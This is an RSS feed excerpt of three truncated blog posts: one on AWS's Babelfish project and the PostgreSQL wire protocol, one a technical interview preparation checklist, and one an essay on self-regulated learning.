<p><img src="https://postgresql.fund/img/dbengines_popularity_ranking-linear-900.png" alt="DB-engines popularity ranking - linear scale"></p>
<p>The trends for the last 8 years are clear: Oracle and SQL Server are constantly declining in popularity; MySQL is slightly declining; and PostgreSQL is clearly growing in popularity. But while PostgreSQL almost tripled in popularity in these eight years, it is still far behind the other three.</p>
<p>PostgreSQL became the database of 2020 because its popularity grew the most in the last year. The other three mentioned databases declined in popularity during 2020. If we assume the same rate of change in popularity will continue for the upcoming years, by 2025 PostgreSQL would still remain in the 4th place, albeit close to SQL Server. It won’t overtake SQL Server until 2026, and by 2030 PostgreSQL would still lag behind Oracle and MySQL.</p>
<table>
<thead>
<tr>
<th></th>
<th>Jan 21</th>
<th>+/- Jan 20</th>
<th>Est. 2025</th>
<th>Est. 2030</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Oracle</em></td>
<td>1,317</td>
<td>-28</td>
<td>1,204</td>
<td>1,064</td>
</tr>
<tr>
<td><em>MySQL</em></td>
<td>1,243</td>
<td>-24</td>
<td>1,146</td>
<td>1,025</td>
</tr>
<tr>
<td><em>Microsoft SQL Server</em></td>
<td>1,023</td>
<td>-71</td>
<td>740</td>
<td>386</td>
</tr>
<tr>
<td><em>PostgreSQL</em></td>
<td>551</td>
<td>44</td>
<td>727</td>
<td>947</td>
</tr>
</tbody>
</table>
<p>How is this analysis related to Babelfish? <strong>Babelfish opens the door to new users, new markets, new opportunities. <strong>Babelfish may bump PostgreSQL’s popularity further, targeting use cases that either PostgreSQL is not able to reach today; or can only reach via complex technology migrations.</strong> Babelfish could be one of the many potential boosts that PostgreSQL needs in order to become a more universally used database</strong>.</p>
<h2 id="to-fork-or-not-to-fork-thats-the-question">To fork, or not to fork, that’s the question</h2>
<p>In their announcement, AWS said that “<em>We are open sourcing Babelfish in 2021. […] We are releasing Babelfish under the Apache 2.0 license. We invite others to become active in the project, and we will see it as a sign of success when developers outside of AWS become committers or maintainers. You can help by adding or extending Babelfish functionality, submitting feature requests, working on documentation, and contributing test cases</em>”. They also mentioned the code will be published on GitHub.</p>
<p><strong>At the time Babelfish will be published, it will likely require changes to PostgreSQL to enable Babelfish to be an extension</strong>. Some people may call that a “fork” of PostgreSQL, and others may call it a “development branch”. The difference between the two will only be clear over time. Note that PostgreSQL development model doesn’t use feature branches, and in my opinion it’s a great model –but this is an entirely different topic. It is really appreciated that AWS is releasing the code as open source, and under a permissive license (that should be compatible with PostgreSQL’s). <strong>If AWS developers work with the PostgreSQL Community to get the necessary changes merged into PostgreSQL core, then it would have been a development branch, and not a fork. This is something that the PostgreSQL Community and all parties involved need to figure out</strong>.</p>
<p>On January 25th, Amazon AWS made a first move. In an <a href="https://www.postgresql.org/message-id/CAGBW59d5SjLyJLt-jwNv%2BoP6esbD8SCB%3D%3D%3D11WVe5%3DdOHLQ5wQ%40mail.gmail.com">email to PostgreSQL’s hackers mailing list</a>, Jan Wieck, a well-known Postgres-er, proposed to start discussing the implementation of protocol hooks. These hooks would enable to implement SQL Server’s protocol as an extension, rather than a fork.</p>
<p>Protocol hooks are, possibly, not the only hooks or modifications to PostgreSQL core that would be required to integrate the whole Babelfish project. With those changes to the core most of the Babelfish code could possibly be integrated in core as an extension(s). I cannot estimate the complexity of these core changes. But I believe that it would be a worthwhile effort, an effort that may further increase PostgreSQL outreach.</p>
<p>Only very recently (Feb 10th, 11th) some initial, very interesting, discussion around this proposal has started (including a very interesting offer to <a href="https://www.postgresql.org/message-id/CADUqk8UndFi7WHVNZscs4ZCk37_2aBUw-K32QA7sQd_3cJ%2Bqng%40mail.gmail.com">open source MySQL protocol compatibility for Postgres!</a>). It’s understandable, it’s a very busy time for PostgreSQL hackers (the last Commitfest for feature inclusion into PostgreSQL 14 is ongoing). But Babelfish was already announced more than two months ago; and it could be published anytime. I believe we need to start a deeper conversation about Postgres-Babelfish integration sooner than later. And what is being discussed so far are mainly technical considerations around the integration of one of the possibly several integration points that may be required. <strong>I’d love to also have a strategic discussion, where the Community would address, from a leadership perspective, what would be the plans for integrating, or not, Babelfish</strong>. <strong>Is Babelfish the Elephant in the Room?</strong> Probably not anymore, but I anyway hope this post will help, at the very least, to spark the strategic discussion.</p>
<p>What is the alternative? What will happen if PostgreSQL would not implement such hooks or will not pursue understanding with AWS, for the common benefit, and help Babelfish and PostgreSQL cooperate and allow for code bases integration?</p>
<p><strong>Under this scenario, AWS will probably have to keep Babelfish as a fork</strong>. For one, AWS already keeps Aurora as a fork, even though it’s an internal one. Given AWS’ well-known customer obsession and that AWS doesn’t kill services that they started offering, I think that if given no other chance they will keep Babelfish as a separate fork, getting its own share of features and contributors. Surely AWS knows that maintaining a fork is expensive. And I believe they have no intention to have it as a fork (otherwise, they won’t be publishing it as open source). So there will be serious intentions and efforts to merge it into PostgreSQL, for the benefit of all. But the recent Elastic case has demonstrated that AWS is committed to the open source software that is part of their managed services, and are willing to step up with a lot of resources when they are required to continue serving their customers. Apparently AWS has around 200 open job positions (!!) for developers working on Elasticsearch. Surely they can do the same for Babelfish, especially given that RDS Postgres/Aurora/Babelfish is probably a much larger business for them than Elastic.</p>
<h2 id="on-protocol-hooks">On protocol hooks</h2>
<p>Jan also argued that “<em>Creating the necessary infrastructure in the postmaster and backend will open up more possibilities, that are not tied to our compatibility efforts. Possible use cases for wire protocol extensibility include the development of a completely new, not backwards compatible PostgreSQL protocol or extending the existing wire protocol</em>”. I cannot agree more. This effort not only benefits the Babelfish integration; but also opens the door for new PostgreSQL protocols.</p>
<p>The current PostgreSQL protocol (v3) <a href="https://www.postgresql.org/docs/7.4/release-7-4.html">has been in use since PostgreSQL 7.4</a>, released in 2003. It works well, and has spun the broadest possible set of drivers, tools and even compatible databases that use it (like CockroachDB, Crate.io or NoisePage, for example). But it also has some limitations and well-known problems. There is an entry in PostgreSQL “TODO” about <a href="https://wiki.postgresql.org/wiki/Todo#Wire_Protocol_Changes_.2F_v4_Protocol">proposed changes for an eventual v4 version of the protocol</a>. I also participated in another <a href="https://github.com/pgjdbc/pgjdbc/blob/95ba7b261e39754674c5817695ae5ebf9a341fae/backend_protocol_v4_wanted_features.md">“brain dump” on v4 proposed features</a>. But despite much talk, v4 has not happened and there’s no ongoing effort to make it happen. v3 is to stay for long.</p>
<p>Why is that, why can’t the protocol evolve? Have a look at <a href="https://www.postgresql.org/message-id/CD5C1525-8B2C-4986-87F0-B1CB3B52ACA7%40wa-research.ch">this thread</a>, where a proposal to implement an HTTP protocol for PostgreSQL was made. Other than the proposal about HTTP itself –which has its own merits, and is a topic that I believe should definitely be discussed again–, the general sentiment was that <strong>any new protocol would have to provide all the features that the current protocol has, work for every use case, do not disrupt existing drivers or provide good means for driver rewrites; and do it significantly better than the current one</strong>.</p>
<h2 id="the-innovators-dilemma">The Innovator’s Dilemma</h2>
<p>I don’t have an MBA, but this to me is a clear case of <a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma">The Innovator’s Dilemma</a>. PostgreSQL protocol v3 is the incumbent, and protocol v4 and/or other protocols like HTTP are the potential disruptive innovators. In what looks like a perfect match for Christensen’s book, a disruptive protocol innovation “<em>would not initially satisfy the demands of even the high end of the market</em>”. In other words, initial versions of these protocols should not target feature parity with the incumbent. They should rather focus on doing the basics, but much better, with a compelling higher value proposition.</p>
<p>Eventually, these protocols “<em>will surpass sustaining technologies</em>” and may end up replacing the current v3 protocol. This was very well explained by Prof. Clayton and is represented on his famous graph comparing the product …</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</a></em></p>]]>
            </description>
            <link>https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114281</guid>
            <pubDate>Fri, 12 Feb 2021 14:58:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Interview Preparation Checklist (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114042">thread link</a>) | @trekhleb
<br/>
February 12, 2021 | https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/ | <a href="https://web.archive.org/web/*/https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <img alt="Technical Interview Preparation Checklist" title="Technical Interview Preparation Checklist" src="https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/00d43/01-cover.png" srcset="https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/63868/01-cover.png 250w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/0b533/01-cover.png 500w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/00d43/01-cover.png 1000w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/aa440/01-cover.png 1500w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/e8950/01-cover.png 2000w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>This article is my attempt to summarise common technical interview process steps and to collect in one place some useful insights from recruiters that they normally send to applicants before the interviews. This is not a comprehensive guide of the interview process and the actual interview steps may vary from company to company.</p>
<h2 id="interview-process-overview">Interview Process Overview<a href="#interview-process-overview" aria-label="interview process overview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Tech Interview Process" title="Tech Interview Process" src="https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/00d43/11.png" srcset="https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/63868/11.png 250w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/0b533/11.png 500w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/00d43/11.png 1000w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/aa440/11.png 1500w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/e8950/11.png 2000w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<h3 id="interview-process-by-time">Interview Process By Time<a href="#interview-process-by-time" aria-label="interview process by time permalink"></a></h3>
<p><span>
      <span></span>
  <img alt="Interview Process By Time" title="Interview Process By Time" src="https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/00d43/0.png" srcset="https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/63868/0.png 250w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/0b533/0.png 500w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/00d43/0.png 1000w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/2cefc/0.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>The common technical interview process consists of three main steps:</p>
<ol>
<li><strong>Phone interview with recruiter</strong> when you’ll be ask to tell about your experience and explain your motivation.</li>
<li><strong>Technical phone interview</strong> where you’ll be asked to solve some tech problems in real time.</li>
<li><strong>On-site (in-person) interview</strong> in company’s office when you’ll be asked to solve technical and system design problems as well as to answer some behavioural questions.</li>
</ol>
<h3 id="interview-process-by-meaning">Interview Process By Meaning<a href="#interview-process-by-meaning" aria-label="interview process by meaning permalink"></a></h3>
<p><span>
      <span></span>
  <img alt="Interview Process By Meaning" title="Interview Process By Meaning" src="https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/00d43/1.png" srcset="https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/63868/1.png 250w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/0b533/1.png 500w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/00d43/1.png 1000w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/98432/1.png 1383w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>All interview steps are mainly consists of three following building blocks:</p>
<ol>
<li><strong>Problem solving.</strong> The main focus here is your ability to solve technical problems by applying different algorithmic approaches and data structures.</li>
<li><strong>System design.</strong> This one is about your ability to combine many pieces (frameworks, approaches, databases, micro-services) and design a system as a whole that will successfully solve certain tasks.</li>
<li><strong>Behavioural questions</strong> that are focused on your experience, motivations, leadership and soft skills.</li>
</ol>
<p>Let’s move on and touch every of these 6 aspects of the interview process.</p>
<hr>
<h2 id="interview-by-time-introductory-call">[Interview By Time] Introductory Call<a href="#interview-by-time-introductory-call" aria-label="interview by time introductory call permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Introductory Call" title="Introductory Call" src="https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/00d43/2.png" srcset="https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/63868/2.png 250w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/0b533/2.png 500w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/00d43/2.png 1000w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/2cefc/2.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>Recruiter will introduce himself and give you more details about the company and projects you might be working on. You’ll be asked to introduce you and explain what was your responsibility on the previous projects.</p>
<p>Normally only things you did during the last 1–3 years matters. So focus on your latest achievements and responsibilities.</p>
<p>Introduce your side-projects, open-source projects and production projects from your latest workplace.</p>
<p>It will be done by means of telephone.</p>
<p>Things to remember:</p>
<ul>
<li>Get familiar with the job description and prepare your questions regarding the job.</li>
<li>Prepare a short introduction of yourself in the context of your profile, professional past, qualifications and education.</li>
<li>Use specific examples. The strongest examples are work based examples, but you can also use study or personal examples.</li>
<li>If you haven’t understood the interviewer’s question, ask them to repeat it or explain it further.</li>
<li>Learn about the company, be passioned about the company’s product (about what company is doing).</li>
<li>Feel free to ask any questions you have about the role or company in general.</li>
</ul>
<p>Explain yours experience examples in a clear manner. Using the STAR technique will help you:</p>
<ul>
<li><em>SITUATION/TASK</em> — Describe the situation/task you faced and the context of the story.</li>
<li><em>ACTION</em> — What actions did you take?</li>
<li><em>RESULTS</em> — How did you measure success for this project? What results did you achieve?</li>
</ul>
<h3 id="-links-to-explore">📚 Links to explore<a href="#-links-to-explore" aria-label=" links to explore permalink"></a></h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Situation,_task,_action,_result">STAR technique on Wikipedia</a></li>
<li><a href="https://www.youtube.com/watch?v=0nN7Q7DrI6Q">STAR technique on YouTube</a></li>
<li><a href="https://careersidekick.com/questions-to-ask-the-interviewer/">105 Smart Questions To Ask In An Interview</a></li>
</ul>
<p><em>ℹ️ ️️Read more about how to prepare to <strong>behavioural interview</strong> below in this article.</em></p>
<h2 id="interview-by-time-technical-phone-interview">[Interview By Time] Technical Phone Interview<a href="#interview-by-time-technical-phone-interview" aria-label="interview by time technical phone interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Technical Phone Interview" title="Technical Phone Interview" src="https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/00d43/3.png" srcset="https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/63868/3.png 250w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/0b533/3.png 500w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/00d43/3.png 1000w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/2cefc/3.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>During the phone interview you’ll have a coding exercise (or task to develop something online).</p>
<p>The call will be 45–60 minutes long.</p>
<p>Some interviews will include 2 people. Don’t worry — one will be there purely for training purposes.</p>
<p>You will need access to a webcam. Wired internet and headphones are recommended but not essential. Your computer may require a plug-in install, so make sure you test the link that will be provided to you by recruiter with enough time before your call. Make sure to take the call in a calm environment.</p>
<p>You might be asked to install and/or use special programs and service like:</p>
<ul>
<li><a href="https://aws.amazon.com/chime/">Amazon Chime</a></li>
<li><a href="https://www.bluejeans.com/">BlueJeans</a></li>
<li><a href="https://hangouts.google.com/">Hangouts</a></li>
<li><a href="https://zoom.us/">Zoom.us</a></li>
<li><a href="https://www.skype.com/en/">Skype</a></li>
<li><a href="https://coderpad.io/">CoderPad</a> or others</li>
</ul>
<p><strong>What to expect during the interview:</strong></p>
<ul>
<li>45 mins initial interview with 1–2 coding questions using a whiteboard (if on site) or laptop and a service similar to CoderPad (if remote).</li>
<li>You will be tested on your problem solving and core CS fundamental skills (theory, algorithms, data structures, design patterns, recursions, binary tree questions, Fibonacci series etc.)</li>
<li>You will need to think of an efficient, optimised and bug-free solution to code up quickly and concisely in whatever language you code best in.</li>
<li>Keep it simple! If you think it’s obvious, it probably is. Start with a simple solution, and think about making it more efficient afterwards.</li>
</ul>
<p><em>ℹ️ ️️Read more about how to prepare to <strong>problem solving</strong> interview below in this article.</em></p>
<h2 id="interview-by-time-on-site-interview">[Interview By Time] On-Site Interview<a href="#interview-by-time-on-site-interview" aria-label="interview by time on site interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="On-Site Interview" title="On-Site Interview" src="https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/00d43/4.png" srcset="https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/63868/4.png 250w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/0b533/4.png 500w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/00d43/4.png 1000w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/2cefc/4.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>For the on-site, you generally have 4 to 5 interviews — at least 2 strictly focused on coding, 1 on design, and 1 on conversation/coding. So basically all three building blocks described at the beginning of the chapter will be included.</p>
<p>There will be a 45-minute lunch to break up your day — the lunch will most likely be with one of the engineers. Feel free to be very candid with the engineer — they will not be providing feedback, but are there to answer any questions/concerns you may not have asked during your interview.</p>
<p><em>ℹ️ Read more about how to prepare to <strong>problem solving</strong>, <strong>system design</strong> and <strong>behavioural interviews</strong> below in this article.</em></p>
<hr>
<h2 id="interview-by-meaning-problem-solving-interview">[Interview By Meaning] Problem Solving Interview<a href="#interview-by-meaning-problem-solving-interview" aria-label="interview by meaning problem solving interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Problem Solving Interview" title="Problem Solving Interview" src="https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/00d43/5.png" srcset="https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/63868/5.png 250w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/0b533/5.png 500w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/00d43/5.png 1000w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/98432/5.png 1383w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p><img src="https://trekhleb.dev/posts-assets/52b4adbcbfcd8ca9db20418c080c3d99/6.gif"></p>
<p><strong>General tips:</strong></p>
<ul>
<li><strong>Explain</strong> — Interviewers want to understand how you think, so explain your thought process and decision making throughout the interview. Remember they are not only evaluating your technical ability, but also how you solve problems. Explicitly state and check assumptions with your interviewer to ensure they are reasonable.</li>
<li><strong>​Clarify</strong> — Many questions will be deliberately open-ended to provide insight into what categories and information you value within the technological puzzle. Interviewers are looking to see how you engage with the problem and your primary method for solving it. Be sure to talk
through your thought process and feel free to ask specific questions if you need clarification.</li>
<li><strong>Improve</strong> — Think about ways to improve the solution you present. It’s worthwhile to think out loud about your initial thoughts to a question. In many cases, your first answer may need some refining and further explanation. If necessary, start with the brute force solution and improve
on it — just let the interviewer know that’s what you’re doing and why.</li>
<li><strong>Practice</strong> — You won’t have access to an IDE or compiler during the interview so practice writing code on paper or a whiteboard. Be sure to test your code and ensure it’s easily readable without bugs. Don’t stress about small syntactical errors like which substring to use for a given method (e.g. start, end or start, length) — just pick one and let your interviewer know.</li>
</ul>
<h3 id="before-the-interview">Before the interview<a href="#before-the-interview" aria-label="before the interview permalink"></a></h3>
<p><strong>Practice! Practice! Practice!</strong></p>
<p>Put yourself under time constraints as speed is important in the interview.</p>
<p><strong>Problems examples:</strong></p>
<ul>
<li>Write the code to print the first element of each “row” of a binary tree.</li>
<li>Implement tic-tac-toe.</li>
<li>Write the code to show the number and type of permutations of a given string.</li>
</ul>
<p>You may use the following services to get more problems examples and possible solutions:</p>
<ul>
<li><a href="https://leetcode.com/">LeetCode</a></li>
<li><a href="https://www.interviewbit.com/practice/">InterviewBit</a></li>
<li><a href="https://www.geeksforgeeks.org/">GeeksForGeeks</a></li>
<li><a href="https://www.hackerrank.com/">HackerRank</a></li>
<li><a href="https://www.lintcode.com/">LintCode</a></li>
<li><a href="https://projecteuler.net/">Coding problems on Project Euler</a></li>
</ul>
<p>You might also want to read <a href="http://www.crackingthecodinginterview.com/">Cracking the coding interview book</a> that will help you to prepare for coding interviews similar to what you will be solving throughout the interview process.</p>
<p><strong>Topics to cover:</strong></p>
<ul>
<li><strong>Coding</strong> — You should know at least one programming language really well, preferably C++, Java, Python, JavaScript, Go, or C. You will be expected to know APIs, Object Oriented Design and Programming, how to test your code, as well as come up with corner cases and edge cases for code. Note that interviewers will focus on conceptual understanding rather than memorisation.</li>
<li><strong>Algorithms</strong> — Approach the problem with both bottom-up and top-down algorithms. You will be expected to know the complexity of an algorithm and how you can improve/change it. Algorithms that are used to solve problems include sorting (plus searching and binary search), divide-and-conquer, dynamic programming/memoization, greediness, recursion or algorithms linked to a specific data structure. Know Big-O notations (e.g. run time) and be ready to discuss complex algorithms like Dijkstra and A*. Knowing the runtimes, theoretical limitations, and basic implementation strategies of different classes of algorithms is more important than memorising the specific details of any given algorithm.</li>
<li><strong>Sorting</strong> — Be familiar with common sorting functions and on what kind of input data they’re efficient on or not. Think about efficiency means in terms of runtime and space used. For example, in exceptional cases insertion-sort or radix-sort are much better than the generic QuickSort/MergeSort/HeapSort answers.</li>
<li><strong>Data structures</strong> — You should study up on as many data structures as possible. Data structures most frequently used are arrays, linked lists, stacks, queues, hash-sets, hash-maps, hash-tables, dictionary, trees and binary trees, heaps and graphs. You should know the data structure inside out, and what algorithms tend to go along with each data structure.</li>
<li><strong>Mathematics</strong> — Some interviewers ask basic discrete math questions. Spend some time before the interview refreshing your memory on (or teaching yourself) the essentials of elementary probability theory and combinatorics. You should be familiar with n-choose-k problems and their ilk.</li>
<li><strong>Graphs</strong> — Consider if a problem can be applied with graph algorithms like distance, search, connectivity, cycle-detection, etc. There are three basic ways to represent a graph in memory (objects and pointers, matrix, and adjacency list) — familiarize yourself with each representation and its pros and cons. You should know the basic graph traversal algorithms, breadth-first search and depth-first search. Know their computational complexity, their tradeoffs …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/">https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/</a></em></p>]]>
            </description>
            <link>https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114042</guid>
            <pubDate>Fri, 12 Feb 2021 14:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Self-Regulated Learning and Why Is It Important?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114006">thread link</a>) | @ggoo
<br/>
February 12, 2021 | https://durmonski.com/self-improvement/what-is-self-regulated-learning/ | <a href="https://web.archive.org/web/*/https://durmonski.com/self-improvement/what-is-self-regulated-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
																					<div>
																										
<p><em>After I finished school in 2007 and later graduated from high school in 2012, I thought it was all over. I kind of swore that I’d never touch a textbook again. “Welcome world,” I said, “I’m ready and now I know everything!” Boy was I wrong. I learned the hard way that our complex and rapidly changing world increasingly demands adopting new skills. And what I’ve accumulated as knowledge during my time behind the desk was not even close to what was happening in the real world.</em> <em>Learning, not simply during the years associated with formal schooling, but across the lifespan seemed a must.</em></p>



<p>Mark Twain famously said, “I have never let my schooling interfere with my education.” More than 100 years later, that’s still the case – or at least it should be. We should not, let the material we study now, or years ago when we were in school, satisfy our appetite and our thirst for knowledge.</p>



<p>In our current setting, it’s extremely important to educate yourself and regularly expose yourself to various topics that are not covered by your school, and/or job, curricula. Simply digesting what your teacher shares or what your company is doing is not enough to stay afloat. You need a different point of view. Make unusual connections. Look for inspiration in topics that others might call crazy or insane.</p>



<p>If you’re a student reading this, you probably haven’t yet discovered that the information shared by your teacher is not enough to help you get a <a href="https://durmonski.com/book-summaries/bullshit-jobs/" target="_blank" aria-label="nice job (opens in a new tab)" rel="noreferrer noopener">nice job</a> or <a href="https://durmonski.com/business/fewer-moving-parts/" target="_blank" aria-label="start a business (opens in a new tab)" rel="noreferrer noopener">start a business</a>. If you have already dealt with the school bureaucracy, fought your way through countless exams and unusually not useful school practices, and you’re now a proud owner of a Job, congrats! You know how little our school system has given to us. You know, I hope, how little you know and how much is yet to be explored. Especially today, when things constantly change and where, as many modern authors state, “change is the only constant.”</p>



<p>Our complex and rapidly changing world creates a need, demands a need, for self-initiated and self-managed learning.</p>



<p>If you still don’t know how little you know, and how much you need to acquire to get a new job, keep your current one, or completely change directions, in this article, I’m going to share why it’s so damn important to become master of your own learning process. To become a sophisticated learner. To learn how to learn and to keep doing it till your very last day.</p>







<h2>What Does Self-Regulated Learning Mean?</h2>



<p>Self-regulation in the learning process is commonly related to formal education. We think that becoming better at learning is not for us if we’re not in school. “I graduated with honors. I don’t need to get better at learning,” you might think.</p>



<p>That may be true. I mean, yes, being your teacher’s favorite student is probably a thought that makes you feel all fuzzy and good. But the information you accumulated in school as I just elegantly pointed out, is not enough – it never was – to transform you into a blossoming individual.</p>



<p>A self-regulated learner is a person who is aware of what he’s consuming and actively working towards self-imposed goals to acquire more relevant information. In this case, relevant means things that are closely related to the interests and skills of that person. Or the interests and skills the person wants to acquire. In other words, self-improving, as banal it might sound.</p>



<p>To avoid interpreting what has just been mentioned as something dry and unimaginable, let us give an example:</p>



<p>So, for example, let’s say that you’re a professional photographer. You’re making a living taking pictures. You are good. You have regular clients. Your <a href="https://durmonski.com/private/using-social-media/" target="_blank" aria-label="Instagram (opens in a new tab)" rel="noreferrer noopener">Instagram</a> profile is widely known in your country. Yet, for how long you think this will last?</p>



<p>As stated, things are changing. And they are changing fast. Reportedly, video is becoming more and more popular. In this situation, if you want to get to the next level, you probably need to school yourself on shooting and later editing video. Then, probably, you need to figure out how to properly attune your clip to fit across the newly created social media channels. And then, you need to learn all the growth-hack techniques other online entrepreneurs so enthusiastically share on their profiles. </p>



<p>To put it differently, there is always something new to learn. But this is not always obvious. In most situations, we reach a certain level of expertise and we settle. We get comfortable. And the moment we get too cozy with what we know is the moment others get ahead.</p>



<p>Self-regulation means actively monitoring your learning process. Being mindful about how and from where to obtain, and master, new information. Settings goals and motivating yourself to expand your expertise.</p>



<p>Plainly, continuously asking yourself the following: “Is the thing I’m reading, watching right now, helping me get better at X?”</p>







<h2>Why is Self-Regulated Learning Important?</h2>



<p>To make things even more difficult, if we have to go back to the example of the photographer, the simple realization that one needs to learn new things is not enough to make him better. The person also needs to have a good learning process.</p>



<p>Something we’re not thought in school, sadly.</p>



<p>The school, the system that runs the school, doesn’t do much to teach us how to actually improve our learning skills. It’s presumed that we know how to learn and study. The material is handed to us and we are expected to know what to do with it.</p>



<p>Or as stated in a scientific paper about self-regulated learning, “There is an overwhelming assumption in our educational system that the most important thing to deliver to students is content.”<span id="easy-footnote-1-13224"></span><span><a href="#easy-footnote-bottom-1-13224" title="Self-Regulated Learning: Beliefs, Techniques, and Illusions &amp;#8211; <a href=&quot;https://www.annualreviews.org/doi/abs/10.1146/annurev-psych-113011-143823&quot; target=&quot;_blank&quot; aria-label=&quot; (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>Annual Reviews</a>."><sup>1</sup></a></span></p>



<p>Besides sharing what is supposedly thought from teachers as great content, there is also a need to organize and remember that content. And today, in the 21st century, there is also the need to find great content. Since there is so much stuff out there, you need to know how to adequately sort the good from the clickbait-y.</p>



<p>Regrettably, schools are not actively teaching us about these things. We’re given a lecture. A paper with resources. Commonly also some sort of assignment. And that’s it. We need to figure how to best connect the pieces. But that’s not the worst of it. We’re also not though that these things also need to happen outside school premises – when we now have jobs and families. That after there is no longer a teacher who is monitoring your assignments and actually imposing them on you, that you should take his role and set assignments for yourself.</p>



<p>When we don’t know any of these things, they end in the graph unknown unknowns.<span id="easy-footnote-2-13224"></span><span><a href="#easy-footnote-bottom-2-13224" title="There are known knowns &amp;#8211; <a href=&quot;https://en.wikipedia.org/wiki/There_are_known_knowns&quot; target=&quot;_blank&quot; aria-label=&quot; (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>WIKI</a>."><sup>2</sup></a></span> Or in other words, things we don’t know exist. Hence, we don’t do them. And since we don’t do them, we never get better at what we do.</p>



<p>Self-regulating your learning process involves creating your own curriculum – being both the teacher and the student. This involves seriously considering what you want to learn and how you need to approach this subject.</p>







<h2>What Are The Self-Regulated Learning Fundamentals?</h2>



<p>Intuitively, high-achievers know how to approach learning. Or they simply found the best way for them after years of trial and error. Others, in contrast, simply go with the flow and do the most obvious exercise when trying to learn something new: they consume the information in front of them, never actually looking for resources on their own, and hope that some of the facts will stick.</p>



<p>These are not the best strategies, though.</p>



